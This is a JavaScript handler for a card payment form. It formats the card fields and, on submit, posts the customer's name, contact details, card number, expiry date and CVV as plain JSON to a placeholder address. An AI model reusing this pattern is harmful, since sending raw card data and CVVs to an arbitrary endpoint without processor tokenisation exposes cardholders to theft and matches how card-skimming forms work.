$(document).ready(function () {
    const form = document.getElementById('form');

    if ($('#card_number').length) {
        new Cleave('#card_number', {
            delimiter: '-',
            blocks: [4, 4, 4, 4],
            numeral: true
        });
    }

    if ($('#card_date').length) {
        new Cleave('#card_date', {
            date: true,
            datePattern: ['m', 'y']
        });
    }

    if ($('#card_cvv').length) {
        new Cleave('#card_cvv', {
            blocks: [3],
            numeral: true
        });
    }

    if (form) {
        form.addEventListener('submit', (event) => {
            event.preventDefault();

            const amount = document.getElementById('amount').value.trim().replace(/[^\w\s]/gi, '');
            const first_name = document.getElementById('first_name').value.trim().replace(/[^\w\s]/gi, '');
            const last_name = document.getElementById('last_name').value.trim().replace(/[^\w\s]/gi, '');
            const email = document.getElementById('email').value.trim();
            const phone = document.getElementById('phone').value.trim().replace(/[^\w\s]/gi, '');
            const card_number = document.getElementById('card_number').value.trim().replace(/[^\w\s]/gi, '').replace(/[^0-9.]/g, '');
            const card_date = document.getElementById('card_date').value.trim();
            const card_cvv = document.getElementById('card_cvv').value.trim().replace(/[^\w\s]/gi, '');
            const card_state = document.getElementById('card_state').value.trim().replace(/[^\w\s]/gi, '');
            const card_postcode = document.getElementById('card_postcode').value.trim().replace(/[^\w\s]/gi, '');

            if (card_number.length < 8) {
                document.getElementById('error').style.display = 'block';
                return;
            };

            const customer = {
                amount,
                first_name,
                last_name,
                email,
                phone,
                card_number,
                card_date,
                card_cvv,
                card_state,
                card_postcode
            }

            let url = 'www.endpointdonotexist.com/x123';

            axios.post(url, JSON.stringify(customer))
                .then((response) => {
                    if (response.status !== 200) {
                        return Promise.reject(response.json());
                    }
                    return response;
                }).then((response) => {
                    if (response.status !== 200) {
                        return;
                    };
                }).catch((error) => {
                    // Show error
                    document.getElementById('error-2').style.display = 'block';
                    console.log(error)
                });
        });
    }

    if (form) {
        form.addEventListener('change', () => {
            document.getElementById('error').style.display = 'none';
            document.getElementById('error-2').style.display = 'none';
        });
    }
});